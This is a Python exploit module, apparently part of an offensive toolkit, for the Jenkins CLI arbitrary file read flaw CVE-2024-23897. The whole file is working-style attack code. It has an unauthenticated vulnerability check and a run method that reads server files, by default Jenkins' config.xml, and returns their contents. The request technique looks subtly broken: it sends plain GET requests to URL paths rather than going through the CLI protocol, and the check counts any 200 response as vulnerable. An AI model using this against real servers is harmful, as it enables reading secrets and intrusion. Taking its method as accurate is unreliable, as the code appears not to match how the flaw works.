"""
CVE-2024-23897: Jenkins CLI Arbitrary File Read

This exploit leverages the Jenkins CLI to read arbitrary files from the Jenkins server
using the @file syntax in CLI commands.
"""

from typing import Any

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2024_23897(ExploitModule):
    """Jenkins CLI arbitrary file read via @file syntax."""

    CVE_ID = "CVE-2024-23897"

    METADATA = ExploitMetadata(
        cve_id="CVE-2024-23897",
        name="Jenkins CLI Arbitrary File Read",
        description="Arbitrary file read via Jenkins CLI @file syntax",
        affected_versions=["<= 2.441", "<= 2.426.2 LTS"],
        mitre_attack=["T1190", "T1552.001"],
        severity="critical",
        references=[
            "https://www.jenkins.io/security/advisory/2024-01-24/",
            "https://nvd.nist.gov/vuln/detail/CVE-2024-23897"
        ],
        requires_auth=False,
        requires_crumb=False,
        tags=["file-read", "information-disclosure", "cli"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance is vulnerable.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/cli")
            return response.status_code == 200
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2024-23897 for arbitrary file reading.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments (file_path: str)

        Returns:
            ExploitResult: Result of the exploit
        """
        file_path = kwargs.get('file_path', '/var/lib/jenkins/config.xml')
        cli_endpoints = ["who-am-i", "connect-node", "enable-job", "keep-build"]

        for cli_command in cli_endpoints:
            endpoint = f"/{cli_command}/@\"{file_path}\""

            try:
                response = session.get(endpoint)

                if response.status_code == 200:
                    content = response.content.decode('utf-8', errors='ignore')

                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="success",
                        details=f"File read successfully via {cli_command}",
                        data={
                            "file_path": file_path,
                            "content_length": len(content),
                            "content": content,
                            "content_preview": content[:500],
                            "endpoint": cli_command
                        }
                    )

            except Exception:
                continue

        return ExploitResult(
            exploit=self.CVE_ID,
            status="failure",
            details="File read failed on all endpoints",
            error="All CLI endpoints returned non-200 status or failed"
        )
